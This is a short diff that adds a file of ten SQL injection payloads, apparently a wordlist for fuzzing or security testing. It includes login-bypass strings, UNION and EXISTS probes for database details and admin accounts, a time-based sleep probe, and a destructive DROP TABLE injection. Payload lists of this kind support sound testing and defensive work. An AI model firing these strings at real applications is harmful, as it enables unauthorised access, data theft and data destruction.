@@ -1,0 +1,11 @@
+' OR '1'='1
+' OR 1=1 --
+admin' -- 
+' UNION SELECT null, version() --
+' AND 1=0 UNION SELECT 1,2,3 --
+" OR "" = "
+') OR ('1'='1
+' OR EXISTS(SELECT * FROM users WHERE username='admin') --
+1; DROP TABLE users --
+' OR sleep(5) AND 'a'='a
+
